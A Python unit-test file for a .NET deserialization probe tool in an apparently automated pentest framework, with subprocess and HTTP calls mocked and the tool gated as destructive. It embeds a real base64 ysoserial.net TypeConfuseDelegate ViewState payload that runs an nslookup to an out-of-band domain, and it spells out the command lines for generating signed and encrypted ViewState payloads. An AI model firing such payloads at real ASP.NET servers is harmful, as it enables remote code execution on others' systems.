"""
Unit tests for the deserialization_probe_dotnet adapter and tool layer.
All subprocess and HTTP calls are mocked; no live target traffic.

The fixtures below are real captured output from the actual
ysoserial.net v1.36 binary run under Wine (wine64 + a real .NET
Framework 4.7.2 install via winetricks dotnet472) on CT 115 -- not
hand-typed shapes:
- REAL_UNPROTECTED_PAYLOAD_B64: `wine64 ysoserial.exe -o base64
  -g TypeConfuseDelegate -f LosFormatter -c "nslookup abc123.oast.me"`
  (decodes to contain the command in plaintext -- confirmed by
  directly decoding and grepping the real output while building this
  adapter).
- REAL_MISSING_ARGS_STDOUT: `wine64 ysoserial.exe` with no arguments at
  all -- confirms the real, exit-code-0 failure shape this adapter
  guards against explicitly (ysoserial.net's own top-level "missing
  arguments" path has no Environment.Exit call at all).
- REAL_INVALID_GADGET_STDOUT / exit 255: `wine64 ysoserial.exe -p
  ViewState -g NoSuchGadget -c x --path=/a --apppath=/
  --validationalg=SHA1 --validationkey=AABBCCDD`.

The keyed-mode ciphertext itself isn't reproduced here (it's ~3KB and,
being real AES-encrypted output, has no plaintext signal to assert on
beyond "non-empty, exit 0, no error") -- generate_payload's own
argv-construction tests below assert the exact real flags instead,
which is what actually matters for correctness.
"""
from __future__ import annotations

import subprocess
from unittest.mock import MagicMock

import requests

from tradecraft.adapters.deserialization_probe_dotnet import execute as dpd_execute
from tradecraft.adapters.deserialization_probe_dotnet import parse as dpd_parse
from tradecraft.tools.deserialization_probe_dotnet import DeserializationProbeDotnet

REAL_UNPROTECTED_PAYLOAD_B64 = (
    "/wEy0xEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBD"
    "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQB"
    "U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcs"
    "IG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5"
    "VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0"
    "ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJl"
    "cmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJl"
    "PW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkD"
    "AAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlz"
    "b25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4w"
    "LCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEA"
    "AAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAA"
    "ABEEAAAAAgAAAAYGAAAAGi9jIG5zbG9va3VwIGFiYzEyMy5vYXN0Lm1lBgcAAAADY21kBAUA"
    "AAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0"
    "aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVs"
    "ZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhv"
    "bGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkI"
    "AAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIr"
    "RGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2Vt"
    "Ymx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lz"
    "dGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5"
    "c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAs"
    "IEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5"
    "c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJh"
    "bCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGlj"
    "cy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQ"
    "dWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lv"
    "bj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkz"
    "NGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwg"
    "UHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGlj"
    "cy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJl"
    "ckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05h"
    "bWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEB"
    "AQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAABhEAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAs"
    "IEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQkNAAAA"
    "BhMAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywg"
    "U3lzdGVtLlN0cmluZykGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChT"
    "eXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQ8AAAAIAAAACQoAAAAGFgAAAEtt"
    "c2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv"
    "a2VuPWI3N2E1YzU2MTkzNGUwODkKBhcAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1"
    "bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQkNAAAACQ4A"
    "AAAKCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
)

# Real stdout from `wine64 ysoserial.exe` with no arguments at all --
# exit code 0, no Environment.Exit call hit on this path at all.
REAL_MISSING_ARGS_STDOUT = (
    "Missing arguments. You may need to provide the command parameter "
    "even if it is being ignored.\nysoserial.net generates deserialization "
    "payloads for a variety of .NET formatters.\n\n== GADGETS ==\n..."
)

# Real stdout from an invalid -g gadget name inside the ViewState
# plugin specifically -- exit 255 (Environment.Exit(-1)).
REAL_INVALID_GADGET_STDOUT = "Gadget not supported."

JAR = "/opt/ysoserial.net/ysoserial.exe"
WINE = "/usr/lib/wine/wine64"
PREFIX = "/root/.wine_ysoserial"


def _completed(stdout: str = "", returncode: int = 0):
    proc = MagicMock()
    proc.stdout = stdout
    proc.stderr = ""
    proc.returncode = returncode
    return proc


def _resp(status: int):
    response = MagicMock()
    response.status_code = status
    return response


def _patch_runtime(monkeypatch, proc):
    monkeypatch.setattr(dpd_execute, "find_runtime", lambda: (WINE, JAR, PREFIX))
    run = MagicMock(return_value=proc)
    monkeypatch.setattr(dpd_execute.subprocess, "run", run)
    return run


# ---------------------------------------------------------------------------
# parse.py -- pure validation/shaping
# ---------------------------------------------------------------------------


def test_validate_oob_domain_requires_a_value():
    domain, error = dpd_parse.validate_oob_domain("")
    assert domain == ""
    assert "missing required oob_domain" in error


def test_validate_gadget_defaults_and_validates():
    assert dpd_parse.validate_gadget("") == (dpd_parse.DEFAULT_GADGET, None)
    assert dpd_parse.validate_gadget("ObjRef") == ("ObjRef", None)
    gadget, error = dpd_parse.validate_gadget("Not Valid!")
    assert gadget == ""
    assert "invalid payload_type" in error


def test_validate_hex_key_accepts_empty_and_hex_only():
    assert dpd_parse.validate_hex_key("", "validation_key") == ("", None)
    assert dpd_parse.validate_hex_key("A1B2C3", "validation_key") == ("A1B2C3", None)
    key, error = dpd_parse.validate_hex_key("not-hex!", "validation_key")
    assert key == ""
    assert "invalid validation_key" in error


def test_validate_algorithms():
    assert dpd_parse.validate_validation_algorithm("") == ("HMACSHA256", None)
    assert dpd_parse.validate_validation_algorithm("sha1") == ("SHA1", None)
    _, error = dpd_parse.validate_validation_algorithm("ROT13")
    assert "invalid validation_algorithm" in error

    assert dpd_parse.validate_decryption_algorithm("") == ("AES", None)
    assert dpd_parse.validate_decryption_algorithm("des") == ("DES", None)
    _, error = dpd_parse.validate_decryption_algorithm("ROT13")
    assert "invalid decryption_algorithm" in error


def test_derive_path_uses_target_path_or_falls_back():
    assert dpd_parse.derive_path("https://target.test/admin/default.aspx") == "/admin/default.aspx"
    assert dpd_parse.derive_path("https://target.test/") == dpd_parse.DEFAULT_PATH
    assert dpd_parse.derive_path("https://target.test") == dpd_parse.DEFAULT_PATH


def test_parse_host_port_and_url_normalization():
    assert dpd_parse.parse_host_port("https://target.test/x") == ("target.test", 443)
    assert dpd_parse.normalize_target_url("target.test/x") == "http://target.test/x"
    assert dpd_parse.normalize_target_url("  ") == ""


def test_parse_result_never_has_a_vulnerable_field():
    raw = dpd_parse.RawDeserializationProbeDotnetResult(
        target="https://target.test", mode="unprotected", gadget="TypeConfuseDelegate",
        oob_domain="abc.oast.me", payload=REAL_UNPROTECTED_PAYLOAD_B64, status_code=200,
    )
    result = dpd_parse.parse_result(raw)
    assert "vulnerable" not in result
    assert result["mode"] == "unprotected"
    assert result["status_code"] == 200


# ---------------------------------------------------------------------------
# execute.py -- subprocess + HTTP, mocked
# ---------------------------------------------------------------------------


def test_build_unprotected_argv_matches_real_cli():
    argv = dpd_execute.build_unprotected_argv("TypeConfuseDelegate", "nslookup abc.oast.me")
    assert argv == ["-o", "base64", "-g", "TypeConfuseDelegate", "-f", "LosFormatter", "-c", "nslookup abc.oast.me"]


def test_build_viewstate_argv_signed_only():
    argv = dpd_execute.build_viewstate_argv(
        "TypeConfuseDelegate", "nslookup abc.oast.me", "/default.aspx", "/",
        "HMACSHA256", "A1B2",
    )
    assert argv == [
        "-p", "ViewState",
        "-g", "TypeConfuseDelegate",
        "-c", "nslookup abc.oast.me",
        "--path=/default.aspx",
        "--apppath=/",
        "--validationalg=HMACSHA256",
        "--validationkey=A1B2",
        "--showraw",
    ]


def test_build_viewstate_argv_signed_and_encrypted():
    argv = dpd_execute.build_viewstate_argv(
        "TypeConfuseDelegate", "nslookup abc.oast.me", "/default.aspx", "/",
        "HMACSHA256", "A1B2", "AES", "FEDC",
    )
    assert argv == [
        "-p", "ViewState",
        "-g", "TypeConfuseDelegate",
        "-c", "nslookup abc.oast.me",
        "--path=/default.aspx",
        "--apppath=/",
        "--validationalg=HMACSHA256",
        "--validationkey=A1B2",
        "--decryptionalg=AES",
        "--decryptionkey=FEDC",
        "--showraw",
    ]


def test_generate_payload_real_argv_and_env(monkeypatch):
    run = _patch_runtime(monkeypatch, _completed(stdout=REAL_UNPROTECTED_PAYLOAD_B64))
    payload, error = dpd_execute.generate_payload(
        WINE, JAR, PREFIX, dpd_execute.build_unprotected_argv("TypeConfuseDelegate", "nslookup abc.oast.me"),
    )
    assert error is None
    assert payload == REAL_UNPROTECTED_PAYLOAD_B64
    assert run.call_args.args[0] == [
        WINE, JAR, "-o", "base64", "-g", "TypeConfuseDelegate", "-f", "LosFormatter", "-c", "nslookup abc.oast.me",
    ]
    env = run.call_args.kwargs["env"]
    assert env["WINEPREFIX"] == PREFIX
    assert env["WINEDEBUG"] == "-all"


def test_generate_payload_invalid_gadget_exit_255(monkeypatch):
    _patch_runtime(monkeypatch, _completed(stdout=REAL_INVALID_GADGET_STDOUT, returncode=255))
    payload, error = dpd_execute.generate_payload(WINE, JAR, PREFIX, ["-p", "ViewState", "-g", "NoSuchGadget"])
    assert payload == ""
    assert "exit 255" in error
    assert "Gadget not supported" in error


def test_generate_payload_missing_arguments_is_an_error_despite_exit_0(monkeypatch):
    """Real, confirmed bug in ysoserial.net's own CLI: this specific
    failure path never calls Environment.Exit, so it reports exit 0
    with full --help text on stdout -- a success-shaped exit code that
    must not be read as a real payload."""
    _patch_runtime(monkeypatch, _completed(stdout=REAL_MISSING_ARGS_STDOUT, returncode=0))
    payload, error = dpd_execute.generate_payload(WINE, JAR, PREFIX, [])
    assert payload == ""
    assert "missing arguments" in error.lower()


def test_generate_payload_timeout(monkeypatch):
    monkeypatch.setattr(dpd_execute, "find_runtime", lambda: (WINE, JAR, PREFIX))
    monkeypatch.setattr(
        dpd_execute.subprocess, "run",
        MagicMock(side_effect=subprocess.TimeoutExpired(cmd="wine64", timeout=60)),
    )
    payload, error = dpd_execute.generate_payload(WINE, JAR, PREFIX, [])
    assert payload == ""
    assert "timed out" in error


def test_generate_payload_oversized_is_rejected(monkeypatch):
    oversized = "A" * (dpd_execute.MAX_PAYLOAD_CHARS + 1)
    _patch_runtime(monkeypatch, _completed(stdout=oversized))
    payload, error = dpd_execute.generate_payload(WINE, JAR, PREFIX, [])
    assert payload == ""
    assert "over the" in error


def test_deliver_posts_viewstate_field_exactly_once(monkeypatch):
    session = MagicMock()
    session.post.return_value = _resp(200)
    status, error = dpd_execute.deliver("https://target.test/x.aspx", "payload123", session=session)
    assert status == 200
    assert error is None
    assert session.post.call_count == 1
    kwargs = session.post.call_args.kwargs
    assert kwargs["data"] == {"__VIEWSTATE": "payload123"}
    assert kwargs["allow_redirects"] is False


def test_deliver_reports_request_exception(monkeypatch):
    session = MagicMock()
    session.post.side_effect = requests.ConnectionError("refused")
    status, error = dpd_execute.deliver("https://target.test", "payload", session=session)
    assert status is None
    assert "refused" in error


def test_execute_unprotected_mode_end_to_end(monkeypatch):
    run = _patch_runtime(monkeypatch, _completed(stdout=REAL_UNPROTECTED_PAYLOAD_B64))
    session = MagicMock()
    session.post.return_value = _resp(200)

    raw = dpd_execute.execute("target.test/x.aspx", oob_domain="abc123.oast.me", session=session)

    assert raw.error is None
    assert raw.mode == "unprotected"
    assert raw.gadget == "TypeConfuseDelegate"
    assert raw.payload == REAL_UNPROTECTED_PAYLOAD_B64
    assert run.call_args.args[0][-1] == "nslookup abc123.oast.me"
    assert session.post.call_args.kwargs["data"] == {"__VIEWSTATE": REAL_UNPROTECTED_PAYLOAD_B64}


def test_execute_keyed_mode_uses_viewstate_plugin(monkeypatch):
    run = _patch_runtime(monkeypatch, _completed(stdout="ZmFrZXBheWxvYWQ="))
    session = MagicMock()
    session.post.return_value = _resp(200)

    raw = dpd_execute.execute(
        "https://target.test/admin/default.aspx",
        oob_domain="abc123.oast.me",
        validation_key="A1B2C3D4",
        decryption_key="FEDC9876",
        session=session,
    )

    assert raw.error is None
    assert raw.mode == "keyed"
    argv = run.call_args.args[0]
    assert argv[2:4] == ["-p", "ViewState"]
    assert "--path=/admin/default.aspx" in argv
    assert "--validationkey=A1B2C3D4" in argv
    assert "--decryptionkey=FEDC9876" in argv
    assert "--showraw" in argv


def test_execute_missing_oob_domain_never_generates_or_delivers(monkeypatch):
    run = _patch_runtime(monkeypatch, _completed(stdout=REAL_UNPROTECTED_PAYLOAD_B64))
    session = MagicMock()
    raw = dpd_execute.execute("target.test", oob_domain="", session=session)
    assert "missing required oob_domain" in raw.error
    run.assert_not_called()
    session.post.assert_not_called()


def test_execute_missing_runtime_never_delivers(monkeypatch):
    monkeypatch.setattr(dpd_execute, "find_runtime", lambda: None)
    session = MagicMock()
    raw = dpd_execute.execute("target.test", oob_domain="abc.oast.me", session=session)
    assert "runtime not available" in raw.error
    session.post.assert_not_called()


def test_execute_invalid_validation_key_never_generates(monkeypatch):
    run = _patch_runtime(monkeypatch, _completed(stdout=REAL_UNPROTECTED_PAYLOAD_B64))
    raw = dpd_execute.execute("target.test", oob_domain="abc.oast.me", validation_key="not-hex!")
    assert "invalid validation_key" in raw.error
    run.assert_not_called()


# ---------------------------------------------------------------------------
# tool.py -- glue, facts, evidence
# ---------------------------------------------------------------------------


def test_tool_is_destructive_and_has_no_required_binary():
    tool = DeserializationProbeDotnet()
    assert tool.tool_id == "deserialization_probe_dotnet"
    assert tool.destructive is True
    assert tool.scope_param == "target"


def test_tool_unavailable_without_runtime(monkeypatch):
    monkeypatch.setattr(dpd_execute, "find_runtime", lambda: None)
    assert DeserializationProbeDotnet().is_available() is False


def test_tool_available_with_runtime(monkeypatch):
    monkeypatch.setattr(dpd_execute, "find_runtime", lambda: (WINE, JAR, PREFIX))
    assert DeserializationProbeDotnet().is_available() is True


def test_tool_excluded_by_default_and_included_with_allow_destructive(monkeypatch):
    """The real tool's contract flag must drive the runtime gate, same
    as every other destructive tool here. is_available is forced True
    so this doesn't depend on wine/ysoserial.net being installed on the
    test host."""
    from tradecraft.execution.loop import _build_tool_map
    from tradecraft.memory.log import EngagementMemory

    monkeypatch.setattr(DeserializationProbeDotnet, "is_available", lambda self: True)
    memory = EngagementMemory()

    assert "deserialization_probe_dotnet" not in _build_tool_map(
        memory, tool_ids=["deserialization_probe_dotnet"]
    )
    assert "deserialization_probe_dotnet" in _build_tool_map(
        memory, tool_ids=["deserialization_probe_dotnet"], allow_destructive=True
    )


def test_tool_run_reports_attempt_facts_and_evidence_no_verdict(monkeypatch):
    _patch_runtime(monkeypatch, _completed(stdout=REAL_UNPROTECTED_PAYLOAD_B64))
    session = MagicMock()
    session.post.return_value = _resp(200)
    original_execute = dpd_execute.execute
    monkeypatch.setattr(
        dpd_execute, "execute", lambda **kwargs: original_execute(session=session, **kwargs)
    )

    tool = DeserializationProbeDotnet()
    params = {"target": "https://target.test/x.aspx", "oob_domain": "abc123.oast.me"}
    result = tool.run(**params)

    assert "vulnerable" not in result
    assert result["mode"] == "unprotected"
    assert result["gadget"] == "TypeConfuseDelegate"
    assert result["status_code"] == 200

    facts = tool.extract_facts(params, result)
    assert facts == [
        {
            "host": "target.test",
            "port": 443,
            "dotnet_deserialization_tested": True,
            "dotnet_deserialization_mode": "unprotected",
            "dotnet_deserialization_oob_domain": "abc123.oast.me",
        }
    ]

    host, evidence = tool.extract_evidence(params, result)
    assert host == "target.test"
    assert evidence["payload"] == REAL_UNPROTECTED_PAYLOAD_B64
    assert evidence["mode"] == "unprotected"
    assert "_full_evidence" not in result


def test_tool_no_facts_or_evidence_on_error(monkeypatch):
    _patch_runtime(monkeypatch, _completed(stdout=REAL_INVALID_GADGET_STDOUT, returncode=255))

    tool = DeserializationProbeDotnet()
    params = {
        "target": "https://target.test/x.aspx",
        "oob_domain": "abc123.oast.me",
        "payload_type": "NoSuchGadget",
    }
    result = tool.run(**params)

    assert "Gadget not supported" in result["error"]
    assert tool.extract_facts(params, result) == []
    assert tool.extract_evidence(params, result) is None
